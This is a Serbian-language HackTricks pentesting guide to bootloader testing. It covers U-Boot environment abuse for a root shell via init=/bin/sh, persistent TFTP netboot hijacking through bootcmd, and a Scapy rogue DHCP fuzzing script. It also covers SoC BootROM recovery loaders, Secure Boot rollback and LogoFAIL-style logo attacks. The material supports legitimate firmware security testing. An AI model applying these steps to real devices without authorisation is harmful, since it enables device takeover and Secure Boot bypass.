# Testiranje bootloader-a

{{#include ../../banners/hacktricks-training.md}}

Sledeći koraci su preporučeni za modifikovanje konfiguracija pokretanja uređaja i testiranje bootloader-a kao što su U-Boot i UEFI-class loaderi. Fokusirajte se na postizanje rane izvršne faze koda, procenu zaštite potpisom/rollback i zloupotrebu recovery ili network-boot puteva.

## U-Boot: brzi rezultati i zloupotreba okruženja

1. Pristup interpreter shell-u
- Tokom boot-a pritisnite poznati break taster (često bilo koji taster, 0, space, ili board-specifičnu "magic" sekvencu) pre nego što `bootcmd` izvrši da biste ušli u U-Boot prompt.

2. Inspekcija stanja boot-a i promenljivih
- Korisne komande:
- `printenv` (dump environment)
- `bdinfo` (board info, memory addresses)
- `help bootm; help booti; help bootz` (supported kernel boot methods)
- `help ext4load; help fatload; help tftpboot` (available loaders)

3. Modifikujte boot argumente da dobijete root shell
- Dodajte `init=/bin/sh` da kernel pređe u shell umesto normalnog init-a:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot sa vašeg TFTP servera
- Konfigurišite mrežu i preuzmite kernel/fit image sa LAN-a:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Persistiranje promena preko environment
- Ako skladište env nije write-protected, možete trajno preuzeti kontrolu:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Proverite promenljive kao što su `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` koje utiču na fallback puteve. Pogrešno konfigurisane vrednosti mogu omogućiti ponovne prekide u shell.

6. Proverite debug/unsafe opcije
- Tražite: `bootdelay` > 0, `autoboot` isključen, neograničeni `usb start; fatload usb 0:1 ...`, mogućnost `loady`/`loads` preko seriala, `env import` sa nepouzdane medije, i kerneli/ramdisk-i učitani bez provere potpisa.

7. Testiranje U-Boot image/verifikacije
- Ako platforma tvrdi secure/verified boot sa FIT image-ima, pokušajte sa unsigned i izmenjenim image-ima:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Odsustvo `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` ili legacy `verify=n` ponašanje često dozvoljava boot-ovanje proizvoljnih payload-a.

## Površina network-boot (DHCP/PXE) i rogue serveri

8. Fuzzing PXE/DHCP parametara
- Legacy BOOTP/DHCP implementacija u U-Boot-u je imala probleme sa bezbednošću memorije. Na primer, CVE‑2024‑42040 opisuje otkrivanje memorije pomoću crafted DHCP odgovora koji mogu ispuštati bajtove iz U-Boot memorije nazad na mrežu. Testirajte DHCP/PXE kod puteve sa predugačkim/edge-case vrednostima (option 67 bootfile-name, vendor options, file/servername polja) i posmatrajte za zastajkivanja/lekove.
- Minimalan Scapy snippet za stresiranje boot parametara tokom netboot-a:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Takođe proverite da li se PXE filename polja prosleđuju shell/loader logici bez sanitizacije kad su povezani sa OS-side provisioning skriptama.

9. Testiranje rogue DHCP servera za command injection
- Podignite rogue DHCP/PXE servis i pokušajte ubaciti karaktere u filename ili opcije da biste dosegli command interpretere u kasnijim fazama boot lanca. Metasploit-ov DHCP auxiliary, `dnsmasq`, ili custom Scapy skripte dobro rade. Obavezno izolujte lab mrežu prvo.

## SoC BootROM recovery režimi koji prepisuju normalan boot

Mnogi SoC-ovi izlažu BootROM "loader" mod koji prihvata kod preko USB/UART čak i kada flash image-i nisu validni. Ako secure-boot fuses nisu spaljeni, ovo može obezbediti proizvoljno izvršenje koda veoma rano u lancu.

- NXP i.MX (Serial Download Mode)
- Alati: `uuu` (mfgtools3) ili `imx-usb-loader`.
- Primer: `imx-usb-loader u-boot.imx` da ubacite i pokrenete custom U-Boot iz RAM-a.
- Allwinner (FEL)
- Tool: `sunxi-fel`.
- Primer: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` ili `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Tool: `rkdeveloptool`.
- Primer: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` za postavljanje loader-a i upload custom U-Boot-a.

Procenite da li uređaj ima secure-boot eFuses/OTP spaljene. Ako nisu, BootROM download modovi često zaobilaze bilo koju višeg nivo verifikaciju (U-Boot, kernel, rootfs) izvršavajući vaš first-stage payload direktno iz SRAM/DRAM-a.

## UEFI/PC-class bootloader-i: brze provere

10. Manipulacija ESP i rollback testiranje
- Mount-ujte EFI System Partition (ESP) i proverite loader komponente: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, vendor logo path-ove.
- Pokušajte boot sa downgraded ili poznato ranjivim signed boot komponentama ako Secure Boot revocations (dbx) nisu ažurni. Ako platforma i dalje veruje starim shim-ovima/boot manager-ima, često možete učitati svoj kernel ili `grub.cfg` sa ESP-a da biste dobili persistenciju.

11. Bugovi u parsiranju boot logo-a (LogoFAIL klasa)
- Nekoliko OEM/IBV firmvera je bilo ranjivo na image-parsing slabosti u DXE koje procesuiraju boot logo-e. Ako napadač može postaviti crafted image na ESP pod vendor-specifičnim putem (npr. `\EFI\<vendor>\logo\*.bmp`) i reboot-ovati, izvršavanje koda tokom ranog boot-a može biti moguće čak i sa Secure Boot omogućenim. Testirajte da li platforma prihvata user-supplied logo-e i da li su ti path-ovi upisivi iz OS-a.

## Hardverske opasnosti

Budite oprezni prilikom interakcije sa SPI/NAND flash tokom ranog boot-a (npr. uzemljenje pinova da biste zaobišli čitanja) i uvek konsultujte datasheet flash memorije. Pogrešno tempirane kratke veze mogu korumpirati uređaj ili programmer.

## Beleške i dodatni saveti

- Pokušajte `env export -t ${loadaddr}` i `env import -t ${loadaddr}` za premještanje environment blob-ova između RAM-a i skladišta; neke platforme dozvoljavaju import env sa removable media bez autentifikacije.
- Za persistenciju na Linux-based sistemima koji boot-uju preko `extlinux.conf`, modifikovanje `APPEND` linije (da ubacite `init=/bin/sh` ili `rd.break`) na boot particiji je često dovoljno kada nema provere potpisa.
- Ako userland pruža `fw_printenv/fw_setenv`, proverite da `/etc/fw_env.config` odgovara stvarnom env skladištu. Pogrešno konfigurisani offset-i vam omogućavaju čitanje/pisanje pogrešne MTD regije.

## Reference

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
